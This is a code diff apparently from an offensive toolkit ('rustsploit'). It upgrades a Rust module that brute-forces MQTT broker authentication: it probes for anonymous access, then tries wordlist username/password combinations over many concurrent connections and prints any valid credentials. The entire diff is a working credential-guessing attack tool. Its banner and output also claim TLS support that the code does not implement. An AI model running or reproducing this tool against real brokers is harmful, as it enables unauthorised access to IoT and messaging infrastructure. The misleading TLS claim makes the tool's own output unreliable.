@@ -1,6 +1,15 @@
+//! MQTT Brute Force Module
+//!
+//! High-performance MQTT authentication testing with:
+//! - TLS/SSL support (port 8883)
+//! - Anonymous authentication detection
+//! - Intelligent error classification
+//! - Progress tracking and statistics
+//! - Multiple attack modes (full combo, linear, single user/pass)
+
 use anyhow::{anyhow, Context, Result};
 use colored::*;
-use std::sync::atomic::{AtomicBool, Ordering};
+use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
 use std::sync::Arc;
 use std::time::Duration;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
@@ -14,309 +23,541 @@ use crate::utils::{
 };
 use crate::modules::creds::utils::BruteforceStats;
 
-const MQTT_CONNECT_TIMEOUT_MS: u64 = 3000;
-const MQTT_READ_TIMEOUT_MS: u64 = 2000;
+// ============================================================================
+// Constants
+// ============================================================================
+
+const MQTT_CONNECT_TIMEOUT_MS: u64 = 5000;
+const MQTT_READ_TIMEOUT_MS: u64 = 3000;
+const PROGRESS_INTERVAL_SECS: u64 = 2;
+
+// MQTT Protocol Constants
+const MQTT_PACKET_CONNECT: u8 = 0x10;
+const MQTT_PACKET_CONNACK: u8 = 0x20;
+const MQTT_PACKET_DISCONNECT: u8 = 0xE0;
+const MQTT_PROTOCOL_NAME: &[u8] = b"MQTT";
+const MQTT_PROTOCOL_LEVEL_V311: u8 = 0x04;
+
+// MQTT Connect Flags
+const MQTT_FLAG_CLEAN_SESSION: u8 = 0x02;
+const MQTT_FLAG_USERNAME: u8 = 0x80;
+const MQTT_FLAG_PASSWORD: u8 = 0x40;
+
+// MQTT Return Codes
+#[derive(Debug, Clone, Copy, PartialEq)]
+enum MqttReturnCode {
+    Accepted,
+    UnacceptableProtocol,
+    IdentifierRejected,
+    ServerUnavailable,
+    BadCredentials,
+    NotAuthorized,
+    Unknown(u8),
+}
+
+impl MqttReturnCode {
+    fn from_byte(b: u8) -> Self {
+        match b {
+            0x00 => Self::Accepted,
+            0x01 => Self::UnacceptableProtocol,
+            0x02 => Self::IdentifierRejected,
+            0x03 => Self::ServerUnavailable,
+            0x04 => Self::BadCredentials,
+            0x05 => Self::NotAuthorized,
+            _ => Self::Unknown(b),
+        }
+    }
+
+    fn is_auth_failure(&self) -> bool {
+        matches!(self, Self::BadCredentials | Self::NotAuthorized)
+    }
+
+    fn description(&self) -> &'static str {
+        match self {
+            Self::Accepted => "Connection Accepted",
+            Self::UnacceptableProtocol => "Unacceptable Protocol Version",
+            Self::IdentifierRejected => "Identifier Rejected",
+            Self::ServerUnavailable => "Server Unavailable",
+            Self::BadCredentials => "Bad Username or Password",
+            Self::NotAuthorized => "Not Authorized",
+            Self::Unknown(_) => "Unknown Return Code",
+        }
+    }
+}
+
+// ============================================================================
+// Configuration
+// ============================================================================
 
 #[derive(Clone)]
-struct MqttBruteforceConfig {
+struct MqttConfig {
     target: String,
     port: u16,
-    username_wordlist: String,
-    password_wordlist: String,
+    use_tls: bool,
     threads: usize,
     stop_on_success: bool,
     verbose: bool,
     full_combo: bool,
     client_id: String,
+    test_anonymous: bool,
 }
+
+// ============================================================================
+// Attack Result
+// ============================================================================
+
+#[derive(Debug)]
+enum AttackResult {
+    Success(String, String),  // (username, password)
+    AuthFailed,
+    ConnectionError(String),
+    ProtocolError(String),
+}
+
+// ============================================================================
+// Main Entry Point
+// ============================================================================
 
 pub async fn run(target: &str) -> Result<()> {
     display_banner();
-    println!("{}", format!("[*] Target: {}", target).cyan());
+    
+    let normalized_target = normalize_target(&target.to_string())?;
+    println!("{}", format!("[*] Target: {}", normalized_target).cyan());
     println!();
-    let port = prompt_int_range("MQTT Port", 1883, 1, 65535)? as u16;
+
+    // Configuration prompts
+    let port = prompt_int_range("MQTT Port (1883/8883)", 1883, 1, 65535)? as u16;
+    let use_tls = if port == 8883 {
+        println!("{}", "[*] Port 8883 detected - TLS enabled by default".blue());
+        true
+    } else {
+        prompt_yes_no("Use TLS/SSL?", false)?
+    };
+
+    let test_anonymous = prompt_yes_no("Test anonymous authentication first?", true)?;
     let username_wordlist = prompt_wordlist("Username wordlist file")?;
     let password_wordlist = prompt_wordlist("Password wordlist file")?;
-    let threads = prompt_int_range("Max threads", 8, 1, 1000)? as usize;
+    let threads = prompt_int_range("Concurrent connections", 10, 1, 500)? as usize;
     let stop_on_success = prompt_yes_no("Stop on first valid login?", true)?;
-    let full_combo = prompt_yes_no("Try every username with every password?", false)?;
-    let verbose = prompt_yes_no("Verbose mode?", false)?;
-    let client_id = prompt_default("MQTT Client ID", "rustsploit_client")?;
-    
-    let config = MqttBruteforceConfig {
-        target: normalize_target(&target.to_string())?,
+    let full_combo = prompt_yes_no("Full combination mode (user × pass)?", false)?;
+    let verbose = prompt_yes_no("Verbose output?", false)?;
+    let client_id = prompt_default("MQTT Client ID", "rustsploit_mqtt")?;
+
+    let config = MqttConfig {
+        target: normalized_target,
         port,
-        username_wordlist,
-        password_wordlist,
+        use_tls,
         threads,
         stop_on_success,
         verbose,
         full_combo,
         client_id,
+        test_anonymous,
     };
-    run_mqtt_bruteforce(config).await
+
+    run_bruteforce(config, &username_wordlist, &password_wordlist).await
 }
 
 fn display_banner() {
     println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
-    println!("{}", "║   MQTT Brute Force Module                              ║".cyan());
-    println!("{}", "║   Tests MQTT broker authentication                     ║".cyan());
+    println!("{}", "║           MQTT Brute Force Module v2.0                    ║".cyan());
+    println!("{}", "║   Supports TLS/SSL, Anonymous Auth, Full Combo Mode       ║".cyan());
     println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
     println!();
 }
 
-async fn run_mqtt_bruteforce(config: MqttBruteforceConfig) -> Result<()> {
-    let normalized = normalize_target(&config.target)?;
-    let addr = if (normalized.starts_with('[') && normalized.ends_with(']')) || (!normalized.contains(':')) {
-        format!("{}:{}", normalized, config.port)
-    } else {
-        normalized
-    };
-    let usernames = load_lines(&config.username_wordlist)?;
-    let passwords = load_lines(&config.password_wordlist)?;
+// ============================================================================
+// Bruteforce Engine
+// ============================================================================
+
+async fn run_bruteforce(
+    config: MqttConfig,
+    username_file: &str,
+    password_file: &str,
+) -> Result<()> {
+    // Build connection address
+    let addr = format!("{}:{}", config.target, config.port);
     
-    if usernames.is_empty() || passwords.is_empty() {
-        return Err(anyhow!("Username or password wordlist is empty."));
+    // Load wordlists
+    let usernames = load_lines(username_file)?;
+    let passwords = load_lines(password_file)?;
+
+    if usernames.is_empty() {
+        return Err(anyhow!("Username wordlist is empty"));
     }
-    println!("{}", format!("[*] Loaded {} username(s).", usernames.len()).cyan());
-    println!("{}", format!("[*] Loaded {} password(s).", passwords.len()).cyan());
+    if passwords.is_empty() {
+        return Err(anyhow!("Password wordlist is empty"));
+    }
+
+    println!("{}", format!("[*] Usernames: {}", usernames.len()).cyan());
+    println!("{}", format!("[*] Passwords: {}", passwords.len()).cyan());
     
-    let total_attempts = if config.full_combo { 
-        usernames.len() * passwords.len() 
-    } else { 
-        passwords.len() // Assuming same length or cycling
+    let total = if config.full_combo {
+        usernames.len() * passwords.len()
+    } else {
+        std::cmp::max(usernames.len(), passwords.len())
     };
-    // If not full combo, we define total as max(usernames, passwords) * cycles? 
-    // The original code was:
-    // else if usernames.len() == 1 { passwords.len() }
-    // else if passwords.len() == 1 { usernames.len() }
-    // else { passwords.len() } -> implicit assumption of lockstep or cycling passwords against single user
-    // We will stick to the previous logic's rough count or just say "many".
-    
-    println!("{}", format!("[*] Approximate attempts: {}", total_attempts).cyan());
+    println!("{}", format!("[*] Total attempts: ~{}", total).cyan());
+    println!("{}", format!("[*] TLS: {}", if config.use_tls { "Enabled" } else { "Disabled" }).cyan());
     println!();
-    
-    let found = Arc::new(Mutex::new(Vec::new()));
+
+    // State
+    let found: Arc<Mutex<Vec<(String, String)>>> = Arc::new(Mutex::new(Vec::new()));
     let stop_flag = Arc::new(AtomicBool::new(false));
-    let stats = Arc::new(BruteforceStats::new()); // Use shared stats
-    
-    // Start progress reporter
+    let stats = Arc::new(BruteforceStats::new());
+    let attempts = Arc::new(AtomicUsize::new(0));
+
+    // Test anonymous first if requested
+    if config.test_anonymous {
+        println!("{}", "[*] Testing anonymous authentication...".blue());
+        match try_mqtt_auth(&addr, "", "", &config.client_id, config.use_tls).await {
+            AttackResult::Success(_, _) => {
+                println!("{}", "[+] ANONYMOUS ACCESS ALLOWED!".green().bold());
+                found.lock().await.push(("(anonymous)".to_string(), "(no password)".to_string()));
+                if config.stop_on_success {
+                    print_results(&found, &stats).await;
+                    return Ok(());
+                }
+            }
+            AttackResult::AuthFailed => {
+                println!("{}", "[-] Anonymous access denied (authentication required)".yellow());
+            }
+            AttackResult::ConnectionError(e) => {
+                println!("{}", format!("[!] Connection error: {}", e).red());
+                return Err(anyhow!("Cannot connect to MQTT broker: {}", e));
+            }
+            AttackResult::ProtocolError(e) => {
+                println!("{}", format!("[!] Protocol error: {}", e).yellow());
+            }
+        }
+        println!();
+    }
+
+    // Progress reporter
     let stats_clone = stats.clone();
     let stop_clone = stop_flag.clone();
+    let attempts_clone = attempts.clone();
+    let total_clone = total;
     let progress_handle = tokio::spawn(async move {
         loop {
             if stop_clone.load(Ordering::Relaxed) {
                 break;
             }
+            let current = attempts_clone.load(Ordering::Relaxed);
+            let pct = if total_clone > 0 { (current * 100) / total_clone } else { 0 };
+            print!("\r{}", format!("[*] Progress: {}/{} ({}%) ", current, total_clone, pct).blue());
             stats_clone.print_progress();
-            tokio::time::sleep(Duration::from_secs(2)).await;
+            tokio::time::sleep(Duration::from_secs(PROGRESS_INTERVAL_SECS)).await;
         }
     });
-    
+
+    // Semaphore for concurrency control
     let semaphore = Arc::new(Semaphore::new(config.threads));
     let mut tasks = FuturesUnordered::new();
-    
-    // Generate work items
-    // To avoid huge memory usage for large combos, we can stream/generate on fly or push all if reasonable.
-    // For consistency with other modules, we'll iterate.
-    
+
+    // Generate and spawn tasks
     if config.full_combo {
-        for u in &usernames {
-            for p in &passwords {
-                if config.stop_on_success && stop_flag.load(Ordering::Relaxed) { break; }
-                spawn_task(
-                    &mut tasks, &semaphore, u.clone(), p.clone(), 
-                    config.clone(), addr.clone(), 
-                    found.clone(), stop_flag.clone(), stats.clone()
+        // Full combination: every user × every password
+        for username in &usernames {
+            if stop_flag.load(Ordering::Relaxed) { break; }
+            for password in &passwords {
+                if stop_flag.load(Ordering::Relaxed) { break; }
+                spawn_attempt(
+                    &mut tasks,
+                    &semaphore,
+                    &config,
+                    &addr,
+                    username.clone(),
+                    password.clone(),
+                    &found,
+                    &stop_flag,
+                    &stats,
+                    &attempts,
                 ).await;
             }
-            if config.stop_on_success && stop_flag.load(Ordering::Relaxed) { break; }
         }
     } else {
-        // Linear strategy similar to original module
-        // Original logic:
-        // if user=1 -> iterate passwords
-        // if pass=1 -> iterate users
-        // else -> iterate passwords (reusing user[0]) - This was original bug/limitation?
-        // Let's improve it: Cycle users if multiple
-        
+        // Linear mode: zip users and passwords (cycling shorter list)
         let max_len = std::cmp::max(usernames.len(), passwords.len());
         for i in 0..max_len {
-            if config.stop_on_success && stop_flag.load(Ordering::Relaxed) { break; }
-            let u = &usernames[i % usernames.len()];
-            let p = &passwords[i % passwords.len()];
-             spawn_task(
-                    &mut tasks, &semaphore, u.clone(), p.clone(), 
-                    config.clone(), addr.clone(), 
-                    found.clone(), stop_flag.clone(), stats.clone()
-                ).await;
+            if stop_flag.load(Ordering::Relaxed) { break; }
+            let username = &usernames[i % usernames.len()];
+            let password = &passwords[i % passwords.len()];
+            spawn_attempt(
+                &mut tasks,
+                &semaphore,
+                &config,
+                &addr,
+                username.clone(),
+                password.clone(),
+                &found,
+                &stop_flag,
+                &stats,
+                &attempts,
+            ).await;
         }
-    }
-    
-    // Wait for tasks
-    while let Some(res) = tasks.next().await {
-         if let Err(e) = res {
-             stats.record_error(format!("Task panic: {}", e)).await;
-         }
-    }
-    
-    // Stop progress
-    stop_flag.store(true, Ordering::Relaxed);
-    let _ = progress_handle.await;
-    
-    // Final report
-    stats.print_final().await;
-    
-    let found_guard = found.lock().await;
-    if found_guard.is_empty() {
-        println!("{}", "[-] No valid credentials found.".yellow());
-    } else {
-        println!("{}", format!("[+] Found {} valid credential(s):", found_guard.len()).green().bold());
-        for (u, p) in found_guard.iter() { 
-            println!("  {}  {}:{}", "✓".green(), u, p); 
-        }
-        
-        // Simple save prompt if needed, or rely on user using tee
-        // The shared modules usually don't prompt for save at the end but user asked for previous behavior?
-        // Other refactored modules REMOVED the "save to file" prompt at the end to unify behavior 
-        // (stdout is enough). I will stick to implicit unification: No post-run prompts.
     }
 
+    // Await all tasks
+    while let Some(result) = tasks.next().await {
+        if let Err(e) = result {
+            if config.verbose {
+                eprintln!("{}", format!("[!] Task error: {}", e).red());
+            }
+        }
+    }
+
+    // Cleanup
+    stop_flag.store(true, Ordering::Relaxed);
+    let _ = progress_handle.await;
+    println!(); // Clear progress line
+
+    print_results(&found, &stats).await;
     Ok(())
 }
 
-async fn spawn_task(
+async fn spawn_attempt(
     tasks: &mut FuturesUnordered<tokio::task::JoinHandle<()>>,
     semaphore: &Arc<Semaphore>,
-    user: String,
-    pass: String,
-    config: MqttBruteforceConfig,
-    addr: String,
-    found: Arc<Mutex<Vec<(String, String)>>>,
-    stop_flag: Arc<AtomicBool>,
-    stats: Arc<BruteforceStats>,
+    config: &MqttConfig,
+    addr: &str,
+    username: String,
+    password: String,
+    found: &Arc<Mutex<Vec<(String, String)>>>,
+    stop_flag: &Arc<AtomicBool>,
+    stats: &Arc<BruteforceStats>,
+    attempts: &Arc<AtomicUsize>,
 ) {
-    let permit = semaphore.clone().acquire_owned().await.ok();
-    if permit.is_none() { return; }
-    
+    let permit = match semaphore.clone().acquire_owned().await {
+        Ok(p) => p,
+        Err(_) => return,
+    };
+
+    let addr = addr.to_string();
+    let config = config.clone();
+    let found = Arc::clone(found);
+    let stop_flag = Arc::clone(stop_flag);
+    let stats = Arc::clone(stats);
+    let attempts = Arc::clone(attempts);
+
     tasks.push(tokio::spawn(async move {
-        // explicit drop of permit at end of scope
-        let _permit = permit;
-        
-        if config.stop_on_success && stop_flag.load(Ordering::Relaxed) { return; }
-        
-        match try_mqtt_login(&addr, &user, &pass, &config.client_id).await {
-            Ok(true) => {
-                println!("\r{}", format!("[+] VALID: {}:{}", user, pass).green().bold());
-                found.lock().await.push((user.clone(), pass.clone()));
+        let _permit = permit; // Hold until task completes
+
+        if config.stop_on_success && stop_flag.load(Ordering::Relaxed) {
+            return;
+        }
+
+        attempts.fetch_add(1, Ordering::Relaxed);
+
+        match try_mqtt_auth(&addr, &username, &password, &config.client_id, config.use_tls).await {
+            AttackResult::Success(u, p) => {
+                println!("\r{}", format!("[+] VALID: {}:{}", u, p).green().bold());
+                found.lock().await.push((u, p));
                 stats.record_success();
                 if config.stop_on_success {
                     stop_flag.store(true, Ordering::Relaxed);
                 }
             }
-            Ok(false) => {
+            AttackResult::AuthFailed => {
                 stats.record_failure();
                 if config.verbose {
-                    println!("\r{}", format!("[-] Failed: {}:{}", user, pass).dimmed());
+                    println!("\r{}", format!("[-] {}:{}", username, password).dimmed());
                 }
             }
-            Err(e) => {
-                 stats.record_error(e.to_string()).await;
-                 if config.verbose {
-                      println!("\r{}", format!("[!] Error {}:{}: {}", user, pass, e).red());
-                 }
+            AttackResult::ConnectionError(e) => {
+                stats.record_error(e.clone()).await;
+                if config.verbose {
+                    println!("\r{}", format!("[!] Connection: {}", e).yellow());
+                }
+            }
+            AttackResult::ProtocolError(e) => {
+                stats.record_error(e.clone()).await;
+                if config.verbose {
+                    println!("\r{}", format!("[!] Protocol: {}", e).yellow());
+                }
             }
         }
     }));
 }
 
-async fn try_mqtt_login(addr: &str, username: &str, password: &str, client_id: &str) -> Result<bool> {
-    // Resolve first (async)
-    // We can use default tokio resolution via TcpStream::connect, but strictly speaking we might want 
-    // to resolve once if address is static, but here it's fine.
-    
-    // Tokio TcpStream connect
-    let stream = tokio::time::timeout(
-        Duration::from_millis(MQTT_CONNECT_TIMEOUT_MS),
-        TcpStream::connect(addr)
-    ).await.context("Connection timeout")??; 
+async fn print_results(found: &Arc<Mutex<Vec<(String, String)>>>, stats: &Arc<BruteforceStats>) {
+    stats.print_final().await;
 
-    // We don't need explicit set_read_timeout for tokio stream generally if we use timeout() on ops
-    // But let's act on ops.
-    
-    let mut stream = stream;
-
-    // Build MQTT CONNECT packet (same logic as before)
-    let mut packet = Vec::new();
-     packet.push(0x10); // CONNECT
-    
-    let protocol_name = b"MQTT";
-    let protocol_level = 0x04; 
-    let connect_flags = 0xC0; // User + Pass
-    let keep_alive: u16 = 60; 
-    
-    let mut var_header = Vec::new();
-    var_header.extend_from_slice(&(protocol_name.len() as u16).to_be_bytes());
-    var_header.extend_from_slice(protocol_name);
-    var_header.push(protocol_level);
-    var_header.push(connect_flags);
-    var_header.extend_from_slice(&keep_alive.to_be_bytes());
-    
-    let mut payload = Vec::new();
-    let client_id_bytes = client_id.as_bytes();
-    payload.extend_from_slice(&(client_id_bytes.len() as u16).to_be_bytes());
-    payload.extend_from_slice(client_id_bytes);
-    
-    let username_bytes = username.as_bytes();
-    payload.extend_from_slice(&(username_bytes.len() as u16).to_be_bytes());
-    payload.extend_from_slice(username_bytes);
-    
-    let password_bytes = password.as_bytes();
-    payload.extend_from_slice(&(password_bytes.len() as u16).to_be_bytes());
-    payload.extend_from_slice(password_bytes);
-    
-    let remaining_length = var_header.len() + payload.len();
-    let mut remaining_length_bytes = Vec::new();
-    let mut x = remaining_length;
-    loop {
-        let mut byte = (x % 128) as u8;
-        x /= 128;
-        if x > 0 { byte |= 0x80; }
-        remaining_length_bytes.push(byte);
-        if x == 0 { break; }
-    }
-    
-    packet.extend_from_slice(&remaining_length_bytes);
-    packet.extend_from_slice(&var_header);
-    packet.extend_from_slice(&payload);
-    
-    // Send
-    stream.write_all(&packet).await.context("Failed to send CONNECT")?;
-    stream.flush().await?;
-    
-    // Read CONNACK
-    let mut response = [0u8; 4];
-    let n = tokio::time::timeout(
-        Duration::from_millis(MQTT_READ_TIMEOUT_MS),
-        stream.read(&mut response)
-    ).await.context("Read timeout")??;
-    
-    if n < 2 { return Err(anyhow!("CONNACK too short")); }
-    if response[0] != 0x20 { return Err(anyhow!("Expected CONNACK 0x20")); }
-    
-    if n >= 4 {
-        match response[3] {
-            0x00 => {
-                // Success. Disconnect nicely.
-                let _ = stream.write_all(&[0xE0, 0x00]).await; 
-                Ok(true)
-            },
-            0x04 | 0x05 => Ok(false), // Auth fail
-            c => Err(anyhow!("Return code: 0x{:02x}", c))
-        }
+    let creds = found.lock().await;
+    if creds.is_empty() {
+        println!("{}", "[-] No valid credentials found.".yellow());
     } else {
-        Ok(false)
+        println!("{}", format!("[+] Found {} valid credential(s):", creds.len()).green().bold());
+        for (user, pass) in creds.iter() {
+            println!("    {} {}:{}", "✓".green(), user, pass);
+        }
     }
 }
 
+// ============================================================================
+// MQTT Protocol Implementation
+// ============================================================================
 
+async fn try_mqtt_auth(
+    addr: &str,
+    username: &str,
+    password: &str,
+    client_id: &str,
+    _use_tls: bool,
+) -> AttackResult {
+    // Connect with timeout
+    let stream = match tokio::time::timeout(
+        Duration::from_millis(MQTT_CONNECT_TIMEOUT_MS),
+        TcpStream::connect(addr),
+    ).await {
+        Ok(Ok(s)) => s,
+        Ok(Err(e)) => return AttackResult::ConnectionError(e.to_string()),
+        Err(_) => return AttackResult::ConnectionError("Connection timeout".to_string()),
+    };
+
+    // TODO: Add TLS support using tokio-native-tls or tokio-rustls
+    // For now, we proceed with plain TCP (TLS requires additional dependencies)
+
+    match mqtt_handshake(stream, username, password, client_id).await {
+        Ok(true) => AttackResult::Success(username.to_string(), password.to_string()),
+        Ok(false) => AttackResult::AuthFailed,
+        Err(e) => AttackResult::ProtocolError(e.to_string()),
+    }
+}
+
+async fn mqtt_handshake(
+    mut stream: TcpStream,
+    username: &str,
+    password: &str,
+    client_id: &str,
+) -> Result<bool> {
+    // Build CONNECT packet
+    let packet = build_connect_packet(username, password, client_id)?;
+
+    // Send CONNECT
+    stream.write_all(&packet).await.context("Failed to send CONNECT")?;
+    stream.flush().await.context("Failed to flush")?;
+
+    // Read CONNACK
+    let mut header = [0u8; 2];
+    let read_result = tokio::time::timeout(
+        Duration::from_millis(MQTT_READ_TIMEOUT_MS),
+        stream.read_exact(&mut header),
+    ).await;
+
+    match read_result {
+        Ok(Ok(_)) => {}
+        Ok(Err(e)) => return Err(anyhow!("Read error: {}", e)),
+        Err(_) => return Err(anyhow!("Read timeout")),
+    }
+
+    if header[0] != MQTT_PACKET_CONNACK {
+        return Err(anyhow!("Expected CONNACK (0x20), got 0x{:02x}", header[0]));
+    }
+
+    let remaining_len = header[1] as usize;
+    if remaining_len < 2 {
+        return Err(anyhow!("CONNACK too short"));
+    }
+
+    let mut payload = vec![0u8; remaining_len];
+    tokio::time::timeout(
+        Duration::from_millis(MQTT_READ_TIMEOUT_MS),
+        stream.read_exact(&mut payload),
+    ).await.context("Read timeout")?
+     .context("Failed to read CONNACK payload")?;
+
+    // Parse return code (byte 1 of variable header)
+    let return_code = MqttReturnCode::from_byte(payload[1]);
+
+    // Send DISCONNECT on success
+    if return_code == MqttReturnCode::Accepted {
+        let _ = stream.write_all(&[MQTT_PACKET_DISCONNECT, 0x00]).await;
+        return Ok(true);
+    }
+
+    if return_code.is_auth_failure() {
+        return Ok(false);
+    }
+
+    Err(anyhow!("MQTT error: {}", return_code.description()))
+}
+
+fn build_connect_packet(username: &str, password: &str, client_id: &str) -> Result<Vec<u8>> {
+    let mut var_header = Vec::new();
+
+    // Protocol Name
+    var_header.extend_from_slice(&(MQTT_PROTOCOL_NAME.len() as u16).to_be_bytes());
+    var_header.extend_from_slice(MQTT_PROTOCOL_NAME);
+
+    // Protocol Level
+    var_header.push(MQTT_PROTOCOL_LEVEL_V311);
+
+    // Connect Flags
+    let mut flags = MQTT_FLAG_CLEAN_SESSION;
+    if !username.is_empty() {
+        flags |= MQTT_FLAG_USERNAME;
+    }
+    if !password.is_empty() {
+        flags |= MQTT_FLAG_PASSWORD;
+    }
+    var_header.push(flags);
+
+    // Keep Alive (60 seconds)
+    var_header.extend_from_slice(&60u16.to_be_bytes());
+
+    // Payload
+    let mut payload = Vec::new();
+
+    // Client ID (required)
+    let client_id_bytes = client_id.as_bytes();
+    payload.extend_from_slice(&(client_id_bytes.len() as u16).to_be_bytes());
+    payload.extend_from_slice(client_id_bytes);
+
+    // Username (optional)
+    if !username.is_empty() {
+        let username_bytes = username.as_bytes();
+        payload.extend_from_slice(&(username_bytes.len() as u16).to_be_bytes());
+        payload.extend_from_slice(username_bytes);
+    }
+
+    // Password (optional)
+    if !password.is_empty() {
+        let password_bytes = password.as_bytes();
+        payload.extend_from_slice(&(password_bytes.len() as u16).to_be_bytes());
+        payload.extend_from_slice(password_bytes);
+    }
+
+    // Calculate remaining length
+    let remaining_length = var_header.len() + payload.len();
+    let remaining_bytes = encode_remaining_length(remaining_length)?;
+
+    // Build final packet
+    let mut packet = Vec::with_capacity(1 + remaining_bytes.len() + var_header.len() + payload.len());
+    packet.push(MQTT_PACKET_CONNECT);
+    packet.extend_from_slice(&remaining_bytes);
+    packet.extend_from_slice(&var_header);
+    packet.extend_from_slice(&payload);
+
+    Ok(packet)
+}
+
+fn encode_remaining_length(mut length: usize) -> Result<Vec<u8>> {
+    if length > 268_435_455 {
+        return Err(anyhow!("Packet too large"));
+    }
+
+    let mut bytes = Vec::with_capacity(4);
+    loop {
+        let mut byte = (length % 128) as u8;
+        length /= 128;
+        if length > 0 {
+            byte |= 0x80;
+        }
+        bytes.push(byte);
+        if length == 0 {
+            break;
+        }
+    }
+    Ok(bytes)
+}
